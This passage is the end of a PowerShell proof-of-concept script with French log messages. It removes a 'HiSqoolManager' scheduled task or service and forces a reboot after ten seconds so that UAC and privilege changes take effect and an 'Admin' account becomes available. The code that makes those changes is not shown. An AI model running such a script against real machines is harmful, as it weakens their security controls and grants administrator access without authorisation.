      Tee-Log "  No HiSqoolManager entry found" Yellow
    }
  } catch {
    W-Log "  Task/service removal error: $($_.Exception.Message)"
    Tee-Log "  Error: $($_.Exception.Message)" Yellow
  }
}

# --- Force reboot ---
if ($globalPass -and $artefactsOk) {
  Tee-Log "" $null
  Tee-Log "=== [REBOOT] redemarrage force dans 10 secondes ===" Red
  Tee-Log "  Les changements UAC + privileges prennent effet au reboot." Yellow
  Tee-Log "  Le compte Admin sera disponible apres le reboot." Yellow
  Tee-Log "" Red
  W-Log "REBOOT scheduled in 10 seconds"
  shutdown /r /t 10 /f /c "POC: Redemarrage pour appliquer les changements UAC + privileges"
}

$log | Set-Content -Path $LogPath -Encoding UTF8
Tee-Log "" Cyan
Tee-Log "Log saved: $LogPath" Cyan
if ($globalPass -and $artefactsOk) { exit 0 } else { exit 1 }
